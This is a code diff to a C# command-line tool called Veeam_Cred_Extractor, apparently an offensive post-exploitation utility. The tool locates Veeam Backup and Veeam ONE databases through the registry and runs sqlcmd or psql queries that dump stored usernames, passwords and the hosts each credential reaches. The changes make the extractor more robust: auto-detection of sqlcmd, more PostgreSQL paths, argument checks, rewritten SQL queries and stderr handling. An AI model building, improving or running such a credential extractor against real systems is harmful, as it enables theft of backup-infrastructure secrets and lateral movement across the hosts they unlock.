@@ -5,7 +5,7 @@ using System.Linq;
 using System.Text;
 using System.Collections.Generic;
 using Microsoft.Win32;
-using System.Data;
+
 
 namespace Veeam_Cred_Extractor
 {
@@ -16,11 +16,13 @@ namespace Veeam_Cred_Extractor
         static byte[] VeeamEntropy = null;
 
         static string[] possiblePsqlPaths = {
+                        @"C:\Program Files\PostgreSQL\18\bin\psql.exe",
                         @"C:\Program Files\PostgreSQL\17\bin\psql.exe",
                         @"C:\Program Files\PostgreSQL\16\bin\psql.exe",
                         @"C:\Program Files\PostgreSQL\15\bin\psql.exe",
                         @"C:\Program Files\PostgreSQL\14\bin\psql.exe",
-                        @"C:\Program Files\PostgreSQL\13\bin\psql.exe"
+                        @"C:\Program Files\PostgreSQL\13\bin\psql.exe",
+                        @"C:\Program Files\PostgreSQL\12\bin\psql.exe"
                     };
 
         static string[] possibleMssqlPaths = {
@@ -69,21 +71,26 @@ namespace Veeam_Cred_Extractor
                 {
                     case "-v":
                         if (i + 1 < args.Length) { veeamDbName = args[++i]; veeamOneDb = veeamDbName; }
+                        else { Console.WriteLine("[ERROR] -v requires a database name."); return; }
                         break;
                     case "-m":
                         if (i + 1 < args.Length) sqlcmdPath = args[++i];
+                        else { Console.WriteLine("[ERROR] -m requires a path to sqlcmd.exe."); return; }
                         break;
                     case "-p":
                         if (i + 1 < args.Length) psqlPath = args[++i];
+                        else { Console.WriteLine("[ERROR] -p requires a path to psql.exe."); return; }
                         break;
                     case "-s":
                         if (i + 1 < args.Length) sqlServerName = args[++i];
+                        else { Console.WriteLine("[ERROR] -s requires a SQL Server instance name."); return; }
                         break;
                     case "-l":
                         listUsers = true;
                         break;
                     case "-u":
                         if (i + 1 < args.Length) targetUser = args[++i];
+                        else { Console.WriteLine("[ERROR] -u requires a username."); return; }
                         break;
                     case "-o":
                         veeamOne = true;
@@ -96,6 +103,17 @@ namespace Veeam_Cred_Extractor
                         Console.WriteLine($"[ERROR] Unknown argument or multiple actions defined: {args[i]}");
                         Console.WriteLine("[PRO-TIP] Read the help menu...");
                         return;
+                }
+            }
+
+            if (sqlcmdPath == "sqlcmd.exe")
+            {
+                var found = Array.Find(possibleMssqlPaths, File.Exists);
+                if (found != null)
+                {
+                    sqlcmdPath = found;
+                    if (DEBUG)
+                        Console.WriteLine($"[DEBUG] Auto-detected sqlcmd.exe: {sqlcmdPath}");
                 }
             }
 
@@ -122,7 +140,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -149,7 +167,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -193,7 +211,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -220,7 +238,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -335,13 +353,24 @@ namespace Veeam_Cred_Extractor
                     }
 
                     // ================== Process Listing ==================
-                    var processes = Process.GetProcesses();
-
-                    bool postgresRunning = processes.Any(p =>
-                        p.ProcessName.Equals("postgres", StringComparison.OrdinalIgnoreCase));
-
-                    bool mssqlRunning = processes.Any(p =>
-                        p.ProcessName.Equals("sqlservr", StringComparison.OrdinalIgnoreCase));
+                    bool postgresRunning = false;
+                    bool mssqlRunning = false;
+                    try
+                    {
+                        foreach (var p in Process.GetProcesses())
+                        {
+                            try
+                            {
+                                if (p.ProcessName.Equals("postgres", StringComparison.OrdinalIgnoreCase))
+                                    postgresRunning = true;
+                                else if (p.ProcessName.Equals("sqlservr", StringComparison.OrdinalIgnoreCase))
+                                    mssqlRunning = true;
+                            }
+                            catch { }
+                            finally { p.Dispose(); }
+                        }
+                    }
+                    catch { }
 
                     Console.WriteLine("[INFO] Database detection summary:");
                     Console.WriteLine(postgresRunning ? "  - PostgreSQL process detected (postgres.exe running)" : "  - PostgreSQL process not detected");
@@ -377,7 +406,7 @@ namespace Veeam_Cred_Extractor
                         }
                     }
 
-                    dbConfigKey = @"SOFTWARE\\Veeam\Veeam ONE";
+                    dbConfigKey = @"SOFTWARE\Veeam\Veeam ONE";
                     dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
                     if (dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled))
                     {
@@ -424,15 +453,16 @@ namespace Veeam_Cred_Extractor
                                     return;
                                 }
                                 Console.WriteLine($"  - MSSQL instance: {mapServer}");
-                                if (mssqlValues.TryGetValue("SqlDatabaseName", out var vdb))
-                                    Console.WriteLine($"  - MSSQL database: {vdb}");
+                                mssqlValues.TryGetValue("SqlDatabaseName", out var vdb);
+                                string mapDb = vdb ?? veeamDbName;
+                                Console.WriteLine($"  - MSSQL database: {mapDb}");
 
-                                string query = "SELECT t1.user_name,STRING_AGG(t2.name, ', ') as hosts FROM [dbo].[Credentials] AS t1 INNER JOIN [dbo].[EPContainers] AS t2 ON t1.id = t2.creds_id GROUP BY t1.user_name ORDER BY t1.user_name;";
+                                string query = "SELECT t1.user_name, STUFF((SELECT ', ' + t2.name FROM [dbo].[EPContainers] AS t2 WHERE t2.creds_id = t1.id ORDER BY t2.name FOR XML PATH('')), 1, 2, '') as hosts FROM [dbo].[Credentials] AS t1 WHERE EXISTS (SELECT 1 FROM [dbo].[EPContainers] WHERE creds_id = t1.id) ORDER BY t1.user_name;";
 
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = sqlcmdPath,
-                                    Arguments = $"-S {mapServer} -E -d {vdb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                    Arguments = $"-S {mapServer} -E -d {mapDb} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -447,8 +477,9 @@ namespace Veeam_Cred_Extractor
                                 var psqlValues = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
                                 if (psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname))
                                     Console.WriteLine($"  - PSQL username: {uname}");
-                                if (psqlValues.TryGetValue("SqlDatabaseName", out var vdb))
-                                    Console.WriteLine($"  - PSQL database: {vdb}");
+                                psqlValues.TryGetValue("SqlDatabaseName", out var vdb);
+                                string mapPsqlDb = vdb ?? veeamDbName;
+                                Console.WriteLine($"  - PSQL database: {mapPsqlDb}");
 
                                 string psqlExe = psqlPath ?? Array.Find(possiblePsqlPaths, File.Exists);
                                 if (psqlExe == null)
@@ -461,7 +492,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = psqlExe,
-                                    Arguments = $"-d {veeamDbName} -U postgres -A -F : -t -c \"{query}\"",
+                                    Arguments = $"-d {mapPsqlDb} -U postgres -A -F : -t -c \"{query}\"",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -472,12 +503,17 @@ namespace Veeam_Cred_Extractor
                                 PrintCredentialHostTable(mapping);
                             }
                         }
+                        else
+                        {
+                            Console.WriteLine("[ERROR] SqlActiveConfiguration not found in registry. Cannot determine database type.");
+                            return;
+                        }
                     }
                     else
                     {
                         Console.WriteLine("[INFO] Veeam One info found in Registry:");
 
-                        var dbConfigKey = @"SOFTWARE\\Veeam\Veeam ONE";
+                        var dbConfigKey = @"SOFTWARE\Veeam\Veeam ONE";
                         var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
                         dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled);
                         if (!string.IsNullOrEmpty(veeamOneEnabled))
@@ -502,11 +538,11 @@ namespace Veeam_Cred_Extractor
                             return;
                         }
 
-                        string query = "SELECT t1.username,STRING_AGG(t3.host_name, ', ') as hosts FROM [monitor].[Credentials] AS t1 INNER JOIN [monitor].[CredentialsLink] AS t2 ON t1.id = t2.cred_id INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id GROUP BY t1.username ORDER BY t1.username;";
+                        string query = "SELECT t1.username, STUFF((SELECT ', ' + t3.host_name FROM [monitor].[CredentialsLink] AS t2 INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id WHERE t2.cred_id = t1.id ORDER BY t3.host_name FOR XML PATH('')), 1, 2, '') as hosts FROM [monitor].[Credentials] AS t1 WHERE EXISTS (SELECT 1 FROM [monitor].[CredentialsLink] WHERE cred_id = t1.id) ORDER BY t1.username;";
                         var psi = new ProcessStartInfo
                         {
                             FileName = sqlcmdPath,
-                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -527,10 +563,14 @@ namespace Veeam_Cred_Extractor
                     string veeamBackupPath = @"SOFTWARE\Veeam\Veeam Backup and Replication";
                     string veeamOnePath = @"SOFTWARE\Veeam\Veeam ONE";
 
-                    bool backupExists = Registry.LocalMachine.OpenSubKey(veeamBackupPath) != null;
+                    bool backupExists;
+                    using (var key = Registry.LocalMachine.OpenSubKey(veeamBackupPath))
+                        backupExists = key != null;
                     Console.WriteLine($"[INFO] Veeam Backup and Replication Registry Entries Exist: {backupExists}");
 
-                    bool oneExists = Registry.LocalMachine.OpenSubKey(veeamOnePath) != null;
+                    bool oneExists;
+                    using (var key = Registry.LocalMachine.OpenSubKey(veeamOnePath))
+                        oneExists = key != null;
                     Console.WriteLine($"[INFO] Veeam One Registry Entries Exist: {oneExists}");
 
 
@@ -581,15 +621,16 @@ namespace Veeam_Cred_Extractor
                                     return;
                                 }
                                 Console.WriteLine($"  - MSSQL instance: {autoServer}");
-                                if (mssqlValues.TryGetValue("SqlDatabaseName", out var vdb))
-                                    Console.WriteLine($"  - MSSQL database: {vdb}");
+                                mssqlValues.TryGetValue("SqlDatabaseName", out var vdb);
+                                string autoDb = vdb ?? veeamDbName;
+                                Console.WriteLine($"  - MSSQL database: {autoDb}");
 
                                 string query = "SELECT user_name,password,description FROM [dbo].[Credentials];";
 
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = sqlcmdPath,
-                                    Arguments = $"-S {autoServer} -E -d {vdb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                                    Arguments = $"-S {autoServer} -E -d {autoDb} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -605,8 +646,9 @@ namespace Veeam_Cred_Extractor
                                 var psqlValues = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
                                 if (psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname))
                                     Console.WriteLine($"  - PSQL username: {uname}");
-                                if (psqlValues.TryGetValue("SqlDatabaseName", out var vdb))
-                                    Console.WriteLine($"  - PSQL database: {vdb}");
+                                psqlValues.TryGetValue("SqlDatabaseName", out var vdb);
+                                string autoPsqlDb = vdb ?? veeamDbName;
+                                Console.WriteLine($"  - PSQL database: {autoPsqlDb}");
 
                                 string psqlExe = psqlPath ?? Array.Find(possiblePsqlPaths, File.Exists);
                                 if (psqlExe == null)
@@ -619,7 +661,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = psqlExe,
-                                    Arguments = $"-d {vdb} -U postgres -A -F : -c \"{query}\"",
+                                    Arguments = $"-d {autoPsqlDb} -U postgres -A -F : -c \"{query}\"",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -630,6 +672,11 @@ namespace Veeam_Cred_Extractor
                                 RunAndProcess(psi, false, false);
                             }
                         }
+                        else
+                        {
+                            Console.WriteLine("[ERROR] SqlActiveConfiguration not found in registry. Cannot determine database type.");
+                            return;
+                        }
                     }
                     // VeeamOne
                     else
@@ -638,7 +685,7 @@ namespace Veeam_Cred_Extractor
 
                         Console.WriteLine("[INFO] Veeam One info found in Registry:");
 
-                        var dbConfigKey = @"SOFTWARE\\Veeam\Veeam ONE";
+                        var dbConfigKey = @"SOFTWARE\Veeam\Veeam ONE";
                         var dbTypeDict = GetVeeamRegistryValues(dbConfigKey, "DatabaseName");
                         dbTypeDict.TryGetValue("DatabaseName", out var veeamOneEnabled);
                         if (!string.IsNullOrEmpty(veeamOneEnabled))
@@ -668,7 +715,7 @@ namespace Veeam_Cred_Extractor
                         var psi = new ProcessStartInfo
                         {
                             FileName = sqlcmdPath,
-                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -s\":\" -y 0 -Y 0",
+                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -y 0 -Y 0",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -792,9 +839,12 @@ namespace Veeam_Cred_Extractor
         {
             using (var process = Process.Start(psi))
             {
+                var errorBuilder = new StringBuilder();
+                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
+                process.BeginErrorReadLine();
                 string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
                 process.WaitForExit();
+                string error = errorBuilder.ToString();
 
                 if (DEBUG)
                 {
@@ -953,9 +1003,12 @@ namespace Veeam_Cred_Extractor
 
             using (var process = Process.Start(psi))
             {
+                var errorBuilder = new StringBuilder();
+                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
+                process.BeginErrorReadLine();
                 string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
                 process.WaitForExit();
+                string error = errorBuilder.ToString();
 
                 if (DEBUG)
                 {
